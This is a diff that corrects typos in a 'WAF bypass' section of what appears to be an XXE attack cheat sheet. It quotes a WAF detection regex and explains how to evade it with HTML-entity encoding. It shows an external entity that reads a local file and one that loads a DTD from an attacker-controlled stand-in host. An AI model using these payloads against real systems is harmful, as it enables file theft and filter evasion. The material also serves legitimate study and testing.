@@ -2,11 +2,11 @@
 
 ### WAF bypass
 
-A usefull technique to bypass WAF forbiden words like SYSTEM is using html entities, the technique here can be used to avoid using blacklisted words.
+A useful technique to bypass WAF forbidden words like SYSTEM is using html entities, the technique here can be used to avoid using blacklisted words.
 
 This is also valid for a regex in this case we will bypass the following regex `/<!(?:DOCTYPE|ENTITY)(?:\s|%|&#[0-9]+;|&#x[0-9a-fA-F]+;)+[^\s]+\s+(?:SYSTEM|PUBLIC)\s+[\'\"]/im`
 
-This regex is stoping us to create a external entity with the following structure: 
+This regex is stopping us to create a external entity with the following structure: 
 
 `<!ENTITY file SYSTEM "file:///path/to/file">` 
 To avoid this we are going to use html entities to encode `<!ENTITY % dtd SYSTEM "http://ourserver.com/bypass.dtd" >` so we can call our dtd in a server we control.
